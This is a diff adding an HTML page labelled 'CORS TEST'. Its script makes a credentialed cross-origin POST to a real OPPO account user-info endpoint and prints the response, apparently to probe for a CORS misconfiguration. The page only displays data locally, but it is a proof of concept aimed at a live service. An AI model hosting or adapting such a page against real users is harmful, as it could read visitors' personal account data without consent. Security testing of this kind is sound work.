@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h2>CORS TEST</h2>
+<pre id="result">Waiting...</pre>
+
+<script>
+fetch("https://id-sg.oppo.com/uc/web/v1/user-info/query-basic", {
+  method: "POST",
+  credentials: "include",
+  headers: {
+    "Content-Type": "application/json"
+  },
+  body: "{}"
+})
+.then(r => r.text())
+.then(data => {
+  document.getElementById("result").innerText = data;
+  console.log("RESPONSE:", data);
+})
+.catch(err => {
+  document.getElementById("result").innerText = err;
+});
+</script>
+</body>
+</html>
